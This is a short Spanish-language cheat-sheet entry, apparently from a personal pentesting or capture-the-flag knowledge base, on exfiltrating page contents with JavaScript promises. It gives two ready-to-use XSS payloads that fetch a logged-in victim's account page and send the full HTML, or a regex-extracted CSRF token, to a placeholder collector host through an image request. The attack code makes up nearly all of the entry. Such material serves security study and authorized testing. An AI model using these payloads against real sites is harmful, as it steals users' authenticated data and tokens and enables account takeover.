# GET y obtener el texto (promesas)

> Traés una página (token CSRF, panel admin, etc.), leés el `.text()` y lo exfiltrás. Encadenado con `.then`.

```html
<script>
fetch('https://VICTIMA.com/my-account')
  .then(r => r.text())
  .then(html => {
    new Image().src = 'https://OASTIFY.com/?d=' + encodeURIComponent(html);
  });
</script>
```

**Sacar un token del HTML y usarlo** (ej. CSRF):
```html
<script>
fetch('https://VICTIMA.com/my-account')
  .then(r => r.text())
  .then(html => {
    const token = html.match(/name="csrf" value="([^"]+)"/)[1];
    new Image().src = 'https://OASTIFY.com/?t=' + token;
  });
</script>
```

Necesita que la víctima esté logueada y que CORS/credenciales lo permitan (mismo sitio suele ir con `credentials:'include'`).

## 🔗 [[exfil-oastify]] · [[../../vulnerabilities/005-cors/cors|CORS]]
